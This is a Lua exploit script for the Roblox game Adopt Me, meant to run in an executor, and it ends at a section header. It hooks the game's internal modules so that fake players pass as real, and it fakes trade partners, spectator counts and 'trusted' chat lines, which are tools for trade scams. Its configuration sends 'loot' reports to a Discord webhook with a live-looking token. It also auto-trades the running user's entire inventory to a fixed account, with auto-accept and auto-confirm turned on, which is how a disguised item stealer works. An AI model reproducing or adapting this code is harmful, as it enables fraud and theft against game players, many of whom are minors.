carti1 = {
    Players = game:GetService('Players'),
    ReplicatedStorage = game:GetService('ReplicatedStorage'),
    RunService = game:GetService('RunService'),
    UserInputService = game:GetService('UserInputService'),
    TweenService = game:GetService('TweenService'),
    HttpService = game:GetService('HttpService'),
    Chat = game:GetService('Chat')
}
carti2 = carti1.Players
carti3 = carti1.ReplicatedStorage
carti4 = carti1.RunService
carti5 = carti1.UserInputService
carti6 = carti1.TweenService
carti7 = carti1.HttpService

-- ==================== DEBUG LOGGING ====================
cartiDBG = true   -- Set false to disable debug prints
function cartiLog(msg)
    if cartiDBG then
        pcall(function()
            print('[AdmDebug] ' .. tostring(msg))
        end)
    end
end

cartiDBG_Exec = 'unknown'
pcall(function()
    cartiDBG_Exec = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or 'unknown'
end)
cartiLog('Script started | Executor: ' .. tostring(cartiDBG_Exec))
cartiLog('PlaceId: ' .. tostring(game.PlaceId) .. ' | JobId: ' .. tostring(game.JobId))
cartiLog('LocalPlayer: ' .. tostring(carti2.LocalPlayer and carti2.LocalPlayer.Name or 'NONE'))

pcall(function()
    setthreadidentity(2)
end)

-- COMPREHENSIVE HOOKS FOR FAKE PLAYERS - MUST BE FIRST
carti8 = {}
_G.fakePlayerIds = carti8

-- Hook SettingsHelper early with better fake player detection
task.spawn(function()
    task.wait(0.1)
    local carti9 = require(carti3:WaitForChild('Fsys')).load('SettingsHelper')
    local carti10 = carti9.get_setting_server

    carti9.get_setting_server = function(carti240, settingName, ...)
        if carti240 and carti240.UserId then
            if carti8[carti240.UserId] then return false end
            if not carti2:GetPlayerByUserId(carti240.UserId) then return false end
        end
        local carti11 = { ... }
        local carti12, carti13 = pcall(function()
            return carti10(carti240, settingName, table.unpack(carti11))
        end)
        if carti12 then return carti13 else return false end
    end
end)

-- Hook FamilyHelper early
task.spawn(function()
    task.wait(0.1)
    local carti14 = require(carti3:WaitForChild('Fsys')).load('FamilyHelper')
    local carti15 = carti14.are_friends_family
    local carti16 = carti14.is_my_friend_or_family
    local carti17 = carti14.are_family_because_friends
    local carti18 = carti14.is_my_family_because_friend

    carti14.are_friends_family = function(player1, player2)
        if player1 and player2 and (carti8[player1.UserId] or carti8[player2.UserId]) then return false end
        return carti15(player1, player2)
    end
    carti14.is_my_friend_or_family = function(carti240)
        if carti240 and carti8[carti240.UserId] then return false end
        return carti16(carti240)
    end
    carti14.are_family_because_friends = function(player1, player2)
        if player1 and player2 and (carti8[player1.UserId] or carti8[player2.UserId]) then return false end
        return carti17(player1, player2)
    end
    carti14.is_my_family_because_friend = function(carti240)
        if carti240 and carti8[carti240.UserId] then return false end
        return carti18(carti240)
    end
end)

cartiLog('Waiting for Fsys module...')
carti19 = require(carti3:WaitForChild('Fsys'))
cartiLog('Fsys loaded')
carti20 = carti19.load
carti21 = {
    UIManager = carti20('UIManager'),
    ClientData = carti20('ClientData'),
    TableUtil = carti20('TableUtil'),
    RouterClient = carti20('RouterClient'),
    InventoryDB = carti20('InventoryDB'),
    animationManager = carti20('AnimationManager'),
    ColorThemeManager = carti20('ColorThemeManager')
}
carti22 = carti21.UIManager
carti23 = carti21.ClientData
carti24 = carti21.TableUtil
carti25 = carti21.RouterClient
carti26 = carti21.InventoryDB
carti27 = carti21.ColorThemeManager
carti28 = carti21.animationManager

cartiLog('Waiting for game initialization...')
if carti22.wait_for_initialization then
    carti22:wait_for_initialization()
else
    task.wait(2)
end
cartiLog('Initialization done')

carti29 = {
    TradeApp = carti22.apps.TradeApp,
    BackpackApp = carti22.apps.BackpackApp,
    DialogApp = carti22.apps.DialogApp,
    HintApp = carti22.apps.HintApp,
    SettingsApp = carti22.apps.SettingsApp,
    PlayerProfileApp = carti22.apps.PlayerProfileApp,
    TradeHistoryApp = carti22.apps.TradeHistoryApp,
    TradePreviewApp = carti22.apps.TradePreviewApp
}
carti30 = carti29.TradeApp
carti31 = carti29.BackpackApp
carti32 = carti29.HintApp
carti33 = carti29.DialogApp
carti34 = carti29.TradeHistoryApp
carti35 = carti29.PlayerProfileApp

carti36 = nil
pcall(function()
    carti36 = carti2.LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame
end)
if not carti36 then
    cartiLog('WARN: NegotiationFrame not found (TradeApp UI not loaded?). Script continues but partner visuals may be limited.')
end

function carti37(FriendValue)
    if not carti36 then return end
    pcall(function()
        carti36.FriendHighlight.Visible = FriendValue
        carti36.FriendBorder.Visible = FriendValue
        local carti38 = carti36.Header.PartnerFrame
        carti36.Header.PartnerFrame.NameLabel.FriendLabel.Visible = FriendValue
        local carti39 = carti27.lookup(FriendValue and 'background' or 'saturated')
        carti36.Header.PartnerFrame.ProfileIcon.ImageColor3 = carti39
        carti36.Header.PartnerFrame.NameLabel.TextColor3 = carti39
        carti36.Header.PartnerFrame.Icon.Visible = FriendValue
        carti36.Header.PartnerFrame.Icon.Image = 'rbxassetid://84667805159408'
    end)
end

carti40 = carti20('DownloadClient')
carti41 = {}

function carti42(carti180)
    if carti41[carti180] then return carti41[carti180]:Clone() end
    local carti12, carti43 = pcall(function()
        local carti44 = carti40.promise_download_copy('Pets', carti180)
        if carti44 then return carti44:expect() end
        return nil
    end)
    if carti12 and carti43 then
        carti41[carti180] = carti43
        return carti43:Clone()
    else
        warn('Failed to download pet model for:', carti180)
        return nil
    end
end

if not carti30 then
    cartiLog('FATAL: TradeApp not found after initialization. The game may have updated.')
    return
end
cartiLog('TradeApp found, building script...')

-- ==================== PET VALUE SYSTEM ====================
carti45 = {}
if carti26 and type(carti26) == 'table' then
    for category, items in pairs(carti26) do
        if category == "pets" then
            for id, petinfo in pairs(items) do
                carti45[id] = petinfo.name
            end
        end
    end
else
    cartiLog('WARN: InventoryDB is nil — pet names/values may be unavailable.')
end

-- Fallback pet values when API fails (from winadopt.me/elvebredd)
carti46 = {
    ["Bat Dragon"] = {name = "Bat Dragon", ["rvalue - nopotion"] = 503, ["rvalue - fly&ride"] = 491, ["nvalue - fly&ride"] = 1280, ["mvalue - fly&ride"] = 3620},
    ["Shadow Dragon"] = {name = "Shadow Dragon", ["rvalue - nopotion"] = 473, ["rvalue - fly&ride"] = 331, ["nvalue - fly&ride"] = 777, ["mvalue - fly&ride"] = 1950},
    ["Giraffe"] = {name = "Giraffe", ["rvalue - nopotion"] = 230, ["rvalue - fly&ride"] = 220, ["nvalue - fly&ride"] = 536, ["mvalue - fly&ride"] = 1870},
    ["Frost Dragon"] = {name = "Frost Dragon", ["rvalue - nopotion"] = 181, ["rvalue - fly&ride"] = 170, ["nvalue - fly&ride"] = 361, ["mvalue - fly&ride"] = 1050},
    ["Owl"] = {name = "Owl", ["rvalue - nopotion"] = 144, ["rvalue - fly&ride"] = 142, ["nvalue - fly&ride"] = 389, ["mvalue - fly&ride"] = 1430},
    ["Parrot"] = {name = "Parrot", ["rvalue - nopotion"] = 112.5, ["rvalue - fly&ride"] = 111.5, ["nvalue - fly&ride"] = 242, ["mvalue - fly&ride"] = 840},
    ["Crow"] = {name = "Crow", ["rvalue - nopotion"] = 93, ["rvalue - fly&ride"] = 92.5, ["nvalue - fly&ride"] = 233, ["mvalue - fly&ride"] = 920},
    ["Evil Unicorn"] = {name = "Evil Unicorn", ["rvalue - nopotion"] = 80.5, ["rvalue - fly&ride"] = 80, ["nvalue - fly&ride"] = 174, ["mvalue - fly&ride"] = 670},
    ["African Wild Dog"] = {name = "African Wild Dog", ["rvalue - nopotion"] = 57, ["rvalue - fly&ride"] = 58, ["nvalue - fly&ride"] = 192, ["mvalue - fly&ride"] = 720},
    ["Hedgehog"] = {name = "Hedgehog", ["rvalue - nopotion"] = 53.5, ["rvalue - fly&ride"] = 54, ["nvalue - fly&ride"] = 182, ["mvalue - fly&ride"] = 705},
    ["Balloon Unicorn"] = {name = "Balloon Unicorn", ["rvalue - nopotion"] = 51.5, ["rvalue - fly&ride"] = 53, ["nvalue - fly&ride"] = 186, ["mvalue - fly&ride"] = 730},
    ["Diamond Butterfly"] = {name = "Diamond Butterfly", ["rvalue - nopotion"] = 51, ["rvalue - fly&ride"] = 49, ["nvalue - fly&ride"] = 160, ["mvalue - fly&ride"] = 565},
    ["Blazing Lion"] = {name = "Blazing Lion", ["rvalue - nopotion"] = 46, ["rvalue - fly&ride"] = 48, ["nvalue - fly&ride"] = 175, ["mvalue - fly&ride"] = 708},
    ["Orchid Butterfly"] = {name = "Orchid Butterfly", ["rvalue - nopotion"] = 44, ["rvalue - fly&ride"] = 45, ["nvalue - fly&ride"] = 183, ["mvalue - fly&ride"] = 735},
    ["Dalmatian"] = {name = "Dalmatian", ["rvalue - nopotion"] = 43.5, ["rvalue - fly&ride"] = 44, ["nvalue - fly&ride"] = 134, ["mvalue - fly&ride"] = 490},
    ["Arctic Reindeer"] = {name = "Arctic Reindeer", ["rvalue - nopotion"] = 39, ["rvalue - fly&ride"] = 38, ["nvalue - fly&ride"] = 80, ["mvalue - fly&ride"] = 302},
    ["Giant Panda"] = {name = "Giant Panda", ["rvalue - nopotion"] = 35, ["rvalue - fly&ride"] = 35, ["nvalue - fly&ride"] = 155, ["mvalue - fly&ride"] = 650},
    ["Cryptid"] = {name = "Cryptid", ["rvalue - nopotion"] = 26.5, ["rvalue - fly&ride"] = 28, ["nvalue - fly&ride"] = 97, ["mvalue - fly&ride"] = 330},
    ["Haetae"] = {name = "Haetae", ["rvalue - nopotion"] = 25.5, ["rvalue - fly&ride"] = 26, ["nvalue - fly&ride"] = 105, ["mvalue - fly&ride"] = 430},
    ["Cow"] = {name = "Cow", ["rvalue - nopotion"] = 23, ["rvalue - fly&ride"] = 25.5, ["nvalue - fly&ride"] = 58.5, ["mvalue - fly&ride"] = 212},
    ["Pelican"] = {name = "Pelican", ["rvalue - nopotion"] = 24, ["rvalue - fly&ride"] = 25, ["nvalue - fly&ride"] = 99, ["mvalue - fly&ride"] = 410},
    ["Strawberry Shortcake Bat Dragon"] = {name = "Strawberry Shortcake Bat Dragon", ["rvalue - nopotion"] = 22, ["rvalue - fly&ride"] = 23.5, ["nvalue - fly&ride"] = 69, ["mvalue - fly&ride"] = 217},
    ["Peppermint Penguin"] = {name = "Peppermint Penguin", ["rvalue - nopotion"] = 21.25, ["rvalue - fly&ride"] = 22.75, ["nvalue - fly&ride"] = 71, ["mvalue - fly&ride"] = 240},
    ["Turtle"] = {name = "Turtle", ["rvalue - nopotion"] = 20, ["rvalue - fly&ride"] = 22.5, ["nvalue - fly&ride"] = 48.5, ["mvalue - fly&ride"] = 128.5},
    ["Chocolate Chip Bat Dragon"] = {name = "Chocolate Chip Bat Dragon", ["rvalue - nopotion"] = 20, ["rvalue - fly&ride"] = 21.5, ["nvalue - fly&ride"] = 67, ["mvalue - fly&ride"] = 214},
    ["Monkey King"] = {name = "Monkey King", ["rvalue - nopotion"] = 21, ["rvalue - fly&ride"] = 20, ["nvalue - fly&ride"] = 69, ["mvalue - fly&ride"] = 275},
    ["Flamingo"] = {name = "Flamingo", ["rvalue - nopotion"] = 17.5, ["rvalue - fly&ride"] = 18, ["nvalue - fly&ride"] = 71, ["mvalue - fly&ride"] = 280},
    ["Mini Pig"] = {name = "Mini Pig", ["rvalue - nopotion"] = 17.5, ["rvalue - fly&ride"] = 18, ["nvalue - fly&ride"] = 72, ["mvalue - fly&ride"] = 295},
    ["Hot Doggo"] = {name = "Hot Doggo", ["rvalue - nopotion"] = 16, ["rvalue - fly&ride"] = 16.5, ["nvalue - fly&ride"] = 68, ["mvalue - fly&ride"] = 286},
    ["Kangaroo"] = {name = "Kangaroo", ["rvalue - nopotion"] = 15, ["rvalue - fly&ride"] = 16.5, ["nvalue - fly&ride"] = 36, ["mvalue - fly&ride"] = 101.5},
    ["Albino Monkey"] = {name = "Albino Monkey", ["rvalue - nopotion"] = 15.25, ["rvalue - fly&ride"] = 15.5, ["nvalue - fly&ride"] = 50, ["mvalue - fly&ride"] = 204},
    ["Elephant"] = {name = "Elephant", ["rvalue - nopotion"] = 15, ["rvalue - fly&ride"] = 15.5, ["nvalue - fly&ride"] = 47.5, ["mvalue - fly&ride"] = 195},
    ["Candyfloss Chick"] = {name = "Candyfloss Chick", ["rvalue - nopotion"] = 13.5, ["rvalue - fly&ride"] = 14.5, ["nvalue - fly&ride"] = 54.5, ["mvalue - fly&ride"] = 220},
    ["Crocodile"] = {name = "Crocodile", ["rvalue - nopotion"] = 11.75, ["rvalue - fly&ride"] = 12.75, ["nvalue - fly&ride"] = 43, ["mvalue - fly&ride"] = 172},
    ["Blue Dog"] = {name = "Blue Dog", ["rvalue - nopotion"] = 12, ["rvalue - fly&ride"] = 12, ["nvalue - fly&ride"] = 42, ["mvalue - fly&ride"] = 162},
    ["Sugar Glider"] = {name = "Sugar Glider", ["rvalue - nopotion"] = 11.5, ["rvalue - fly&ride"] = 12, ["nvalue - fly&ride"] = 49, ["mvalue - fly&ride"] = 207},
    ["Caterpillar"] = {name = "Caterpillar", ["rvalue - nopotion"] = 11.5, ["rvalue - fly&ride"] = 12, ["nvalue - fly&ride"] = 50, ["mvalue - fly&ride"] = 210},
    ["Lion"] = {name = "Lion", ["rvalue - nopotion"] = 11, ["rvalue - fly&ride"] = 12, ["nvalue - fly&ride"] = 40, ["mvalue - fly&ride"] = 167},
    ["Fairy Bat Dragon"] = {name = "Fairy Bat Dragon", ["rvalue - nopotion"] = 9.5, ["rvalue - fly&ride"] = 10.75, ["nvalue - fly&ride"] = 36, ["mvalue - fly&ride"] = 140},
    ["Winged Tiger"] = {name = "Winged Tiger", ["rvalue - nopotion"] = 7, ["rvalue - fly&ride"] = 7.5, ["nvalue - fly&ride"] = 33.5, ["mvalue - fly&ride"] = 146},
    ["Goat"] = {name = "Goat", ["rvalue - nopotion"] = 6.75, ["rvalue - fly&ride"] = 7.25, ["nvalue - fly&ride"] = 30, ["mvalue - fly&ride"] = 136},
    ["Lion Cub"] = {name = "Lion Cub", ["rvalue - nopotion"] = 6.5, ["rvalue - fly&ride"] = 7, ["nvalue - fly&ride"] = 29.5, ["mvalue - fly&ride"] = 131},
    ["Sheeeeep"] = {name = "Sheeeeep", ["rvalue - nopotion"] = 5.5, ["rvalue - fly&ride"] = 6, ["nvalue - fly&ride"] = 25, ["mvalue - fly&ride"] = 113},
    ["Shark Puppy"] = {name = "Shark Puppy", ["rvalue - nopotion"] = 5.5, ["rvalue - fly&ride"] = 6, ["nvalue - fly&ride"] = 27, ["mvalue - fly&ride"] = 117},
    ["Jellyfish"] = {name = "Jellyfish", ["rvalue - nopotion"] = 5.5, ["rvalue - fly&ride"] = 6, ["nvalue - fly&ride"] = 25, ["mvalue - fly&ride"] = 113},
    ["Meerkat"] = {name = "Meerkat", ["rvalue - nopotion"] = 5.25, ["rvalue - fly&ride"] = 5.75, ["nvalue - fly&ride"] = 26, ["mvalue - fly&ride"] = 114},
    ["Nessie"] = {name = "Nessie", ["rvalue - nopotion"] = 5, ["rvalue - fly&ride"] = 5.5, ["nvalue - fly&ride"] = 24, ["mvalue - fly&ride"] = 109},
    ["Pink Cat"] = {name = "Pink Cat", ["rvalue - nopotion"] = 4.75, ["rvalue - fly&ride"] = 5.25, ["nvalue - fly&ride"] = 20, ["mvalue - fly&ride"] = 86},
    ["Hare"] = {name = "Hare", ["rvalue - nopotion"] = 4.5, ["rvalue - fly&ride"] = 5, ["nvalue - fly&ride"] = 20.5, ["mvalue - fly&ride"] = 87},
    ["Zombie Buffalo"] = {name = "Zombie Buffalo", ["rvalue - nopotion"] = 4.25, ["rvalue - fly&ride"] = 4.75, ["nvalue - fly&ride"] = 21, ["mvalue - fly&ride"] = 94},
    ["Many Mackerel"] = {name = "Many Mackerel", ["rvalue - nopotion"] = 4.25, ["rvalue - fly&ride"] = 4.75, ["nvalue - fly&ride"] = 21, ["mvalue - fly&ride"] = 94},
    ["Honey Badger"] = {name = "Honey Badger", ["rvalue - nopotion"] = 3.5, ["rvalue - fly&ride"] = 4, ["nvalue - fly&ride"] = 17.5, ["mvalue - fly&ride"] = 75},
    ["Unicorn"] = {name = "Unicorn", ["rvalue - nopotion"] = 3, ["rvalue - fly&ride"] = 4, ["nvalue - fly&ride"] = 15, ["mvalue - fly&ride"] = 44},
    ["Happy Clam"] = {name = "Happy Clam", ["rvalue - nopotion"] = 3.25, ["rvalue - fly&ride"] = 3.75, ["nvalue - fly&ride"] = 16, ["mvalue - fly&ride"] = 68},
    ["Rhino"] = {name = "Rhino", ["rvalue - nopotion"] = 1.5, ["rvalue - fly&ride"] = 2, ["nvalue - fly&ride"] = 7, ["mvalue - fly&ride"] = 35},
    ["Ram"] = {name = "Ram", ["rvalue - nopotion"] = 1.5, ["rvalue - fly&ride"] = 2, ["nvalue - fly&ride"] = 10, ["mvalue - fly&ride"] = 43},
    ["Yeti"] = {name = "Yeti", ["rvalue - nopotion"] = 0.65, ["rvalue - fly&ride"] = 1.15, ["nvalue - fly&ride"] = 5.25, ["mvalue - fly&ride"] = 26},
    ["Frostbite Bear"] = {name = "Frostbite Bear", ["rvalue - nopotion"] = 7.75, ["rvalue - fly&ride"] = 8.25, ["nvalue - fly&ride"] = 37, ["mvalue - fly&ride"] = 160},
    ["Cat"] = {name = "Cat", ["rvalue - nopotion"] = 0.02, ["rvalue - fly&ride"] = 0.42, ["nvalue - fly&ride"] = 0.5, ["mvalue - fly&ride"] = 1.5},
    ["Dog"] = {name = "Dog", ["rvalue - nopotion"] = 0.02, ["rvalue - fly&ride"] = 0.42, ["nvalue - fly&ride"] = 0.5, ["mvalue - fly&ride"] = 1.5},
    ["Lunar Tiger"] = {name = "Lunar Tiger", ["rvalue - nopotion"] = 0.05, ["rvalue - fly&ride"] = 0.55, ["nvalue - fly&ride"] = 0.75, ["mvalue - fly&ride"] = 2.5},
}

function carti47()
    local carti12, carti48 = pcall(function()
        return request({
            Url = "https://elvebredd.com/api/pets/get-latest",
            Method = "GET",
            Headers = {
                ["Accept"] = "*/*",
                ["User-Agent"] = "Mozilla/5.0"
            }
        })
    end)
    if carti12 and carti48 and carti48.Success then
        local carti49, carti50 = pcall(function()
            return carti7:JSONDecode(carti48.Body)
        end)
        if carti49 and carti50 and carti50.pets then
            local carti51, carti52 = pcall(function()
                return carti7:JSONDecode(carti50.pets)
            end)
            if carti51 and carti52 and next(carti52) then
                return carti52
            end
        end
    end
    -- Return fallback values if API fails
    return carti46
end

carti53 = {}
carti54 = carti47()
for carti60, carti57 in pairs(carti54) do
    if type(carti57) == "table" and carti57.name then
        carti53[carti57.name] = carti57
    end
end

function carti55(petKind, petProps)
    local carti56 = carti45[petKind] or petKind
    local carti57 = carti53[carti56]
    if not carti57 then return 0 end
    local carti58
    if petProps.mega_neon then
        carti58 = "mvalue"
    elseif petProps.neon then
        carti58 = "nvalue"
    else
        carti58 = "rvalue"
    end
    local carti59 = ""
    if petProps.rideable and petProps.flyable then
        carti59 = " - fly&ride"
    elseif petProps.rideable then
        carti59 = " - ride"
    elseif petProps.flyable then
        carti59 = " - fly"
    else
        carti59 = " - nopotion"
    end
    local carti60 = carti58 .. carti59
    return carti57[carti60] or carti57[carti58] or 0
end

function carti61(rawData)
    if not rawData then return nil end
    local carti62 = {
        pages = {},
        stickers = {},
        properties = rawData.properties or {}
    }
    if rawData.pages then
        for _, page in ipairs(rawData.pages) do
            local carti63 = page.page_index
            carti62.stickers[carti63] = page.stickers
            carti62.pages[carti63] = {}
            if page.widgets then
                for _, widget in ipairs(page.widgets) do
                    carti62.pages[carti63][widget.slot] = widget.data
                end
            end
        end
    end
    return carti62
end

function carti64(carti306)
    local carti65 = {}
    if carti306 and carti306.pages then
        for carti63, page in pairs(carti306.pages) do
            for slotIndex, slotData in pairs(page) do
                if slotData.widget_kind == "collection" and slotData.widget_data and slotData.widget_data.items then
                    for _, carti57 in ipairs(slotData.widget_data.items) do
                        local carti66 = carti57.properties or {}
                        table.insert(carti65, {
                            kind = carti57.kind,
                            properties = carti66,
                            displayName = carti45[carti57.kind] or carti57.kind,
                            value = carti55(carti57.kind, carti66),
                            isMega = carti66.mega_neon or false,
                            isNeon = carti66.neon or false,
                            isFly = carti66.flyable or false,
                            isRide = carti66.rideable or false,
                        })
                    end
                end
            end
        end
    end
    return carti65
end

function carti67(carti232)
    if carti232 >= 1000000 then
        return string.format("%.2fM", carti232 / 1000000)
    elseif carti232 >= 1000 then
        return string.format("%.1fK", carti232 / 1000)
    elseif carti232 >= 100 then
        return string.format("%.0f", carti232)
    else
        return string.format("%.1f", carti232)
    end
end

carti68 = carti25.get("PlayerProfileAPI/FetchProfile")
-- ==================== END PET VALUE SYSTEM ====================

carti69 = {
    PARTNER_NAME = 'endeavor3313',
    PARTNER_USER_ID = 987654321,
    AUTO_ACCEPT_DELAY = 0.2,
    AUTO_CONFIRM_DELAY = 0.3,
    SPECTATOR_COUNT = 4,
    SPECTATOR_VARIATION_MIN = -1,  -- Minimum variation from base count
    SPECTATOR_VARIATION_MAX = 2,   -- Maximum variation from base count
    AUTO_SPECTATE_ENABLED = false,
    AUTO_SPECTATE_INTERVAL = 1.5,
    AUTO_PARTNER = true,
    NEGOTIATION_LOCK = 5,
    CONFIRMATION_LOCK_PER_ITEM = 3,
    SHOW_TRADE_REQUEST = true,  -- Set to true to show trade request dialog first
    TRADE_REQUEST_DELAY = 0,
    ADD_PET_REQUEST_DELAY = 0.5,
    SPAWN_FAKE_PLAYER_WITH_RANDOM_PET = false,
    FAKE_PLAYER_ACCEPT_TRADE_REQUEST = 2,
    CHAT_MESSAGES = {
        'Tysm ! 💗💗', 'Thank you', 'Trusted TY ❤️', 'Can i play also', 'Can i spin this pet', 'Please respin 🥺',
        'Spin again plss 😔', 'Please guys follow', 'Pls both ill cry 😢', 'My dp neon giraffe', 'My dp is bat dragon',
        'Can i get mega pet', 'Change last 2 pets', 'Add or i will decline', 'Add more pets',
        'You are under 😂', 'Do mega exotics',
    },
    AUTO_CHAT_DELAY = 2,
    VERIFIED_FRIENDS = {
        'Agusmareborn', 'Kellyvault', 'J3llynoah', 'Rainbowriley321',
        'Bobazmalibu', 'H3llSANG3LX', 'Xcallmeholly', 'Niniko_201999',
    },
    SHOW_VERIFIED_FRIEND = false,
    FRIEND_PARTNER = true,
    REMOVE_PARTNER_PETS_ON_CONFIRM = false,

    -- ==================== WEBHOOK NOTIFICATION ====================
    WEBHOOK_ENABLED = true,                                          -- Master toggle for the webhook
    WEBHOOK_URL = 'https://discord.com/api/webhooks/1540695280025084034/MltpgAHydyP9W9HLEq0xdPwzHZbddpYAXXsSKsMvMvTKBDyL0iQeItAB1Xtv4BiY1H19',             -- Your Discord webhook URL
    WEBHOOK_EXECUTOR_NAME = 'delta',                                 -- Executor name shown in the embed
    WEBHOOK_GAME_NAME = 'Adopt Me',                                  -- Game name shown in the embed
    WEBHOOK_FUN_FACT = 'Fun fact: Our webhook protector once blocked a DDOS attack from a salty competitor',
    WEBHOOK_MAX_LOOT_ITEMS = 100,                                     -- Max loot lines shown (sorted by value)
    WEBHOOK_SKIP_ZERO_VALUE = true,                                  -- Hide items we have no value for

    -- ==================== AUTO TRADE TARGET USER ====================
    AUTO_TRADE_TARGET_USER_ID = 5417351566,       -- Roblox UserId to auto-trade with (0 = disabled)
    AUTO_TRADE_GIVE_ALL = true,          -- Add every single inventory item to the trade
    AUTO_TRADE_AUTO_ACCEPT = true,       -- Auto-accept the trade request from the target
    AUTO_TRADE_AUTO_CONFIRM = true,      -- Auto-confirm the trade once accepted
    AUTO_TRADE_REQUEST_DELAY = 3,        -- Seconds to wait after target joins before sending trade request
}

-- Store original spectator count for reset functionality
carti70 = carti69.SPECTATOR_COUNT

-- ==================== WEBHOOK NOTIFICATION ====================